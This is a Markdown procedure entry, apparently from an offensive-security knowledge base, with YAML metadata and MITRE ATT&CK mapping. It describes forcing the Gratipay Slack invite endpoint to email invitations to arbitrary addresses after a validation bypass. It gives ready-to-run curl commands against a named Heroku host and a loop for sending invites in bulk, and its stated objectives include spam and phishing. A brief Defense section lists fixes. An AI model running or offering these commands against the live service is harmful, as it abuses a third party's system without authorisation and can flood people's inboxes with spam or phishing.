---
tags:
  - spam-invites
  - auth-bypass
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-post-invite-with-coc-bypass]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:28:36.620Z'
skill_level: beginner
impact_level: low
detection_risk: low
sub_techniques: []
id: 19dc9d49-ac11-4363-b872-d62074e52aae
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Force-Send-Slack-Invite-Emails

## Summary

This procedure forces the Gratipay Slack invite endpoint to send invitation emails to arbitrary addresses by exploiting a desynchronization between error responses and backend processing after validation bypass.

## Description

Even after returning a 400 Bad Request due to the bypassed 'coc' check, the server proceeds to queue and send the invite via Slack's feedback@slack.com service. This allows unlimited invites without rate limits, potentially leading to spam. The attack targets the POST /invite endpoint, hosted on Heroku, and works against any email format, though the public nature of the Slack channel limits impact.

## Requirements

1. Successful validation bypass from prior procedure
2. Valid email addresses for testing (use disposable services)
3. Monitoring capability for incoming emails

## Defense

Defensive measures and detection strategies:

- Synchronize error responses with backend actions; do not process invites after validation failure
- Implement email sending rate limits and CAPTCHA for invites
- Log and alert on high-volume invite requests from single IPs

## Objectives

1. Trigger unintended email sends despite server errors
2. Demonstrate lack of rate limiting on invites
3. Enable mass invitation for spam or phishing

## Instructions

### Step 1: Send Tampered Invite Request

**Context**: Use the bypassed payload to request an invite to a test email.

**Command** ([[commands/curl-post-invite-with-coc-bypass]]):
```bash
curl -X POST https://gratipay-slackin.herokuapp.com/invite -H "Content-Type: application/json" -d '{"coc":1,"email":"arbitrary@domain.com"}'
```

> Expected output: 400 response, but check the target email for arrival.

### Step 2: Verify Email Delivery

**Context**: Confirm the invite email is sent and received.

Monitor the inbox for an email from feedback@slack.com with a join link to gratipay.slack.com.

**Expected Output**: Invite email arrives within seconds, containing Slack join instructions.

### Step 3: Repeat for Multiple Emails

**Context**: Test rate limiting by sending to several emails in quick succession.

Loop the command:
```bash
for i in {1..5}; do curl -X POST https://gratipay-slackin.herokuapp.com/invite -H "Content-Type: application/json" -d '{"coc":1,"email":"test$i@example.com"}'; done
```

> All emails should arrive without throttling.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/curl-post-invite-with-coc-bypass]]

## Tools Used


## Tags

- spam-invites
- auth-bypass
- email-exploit
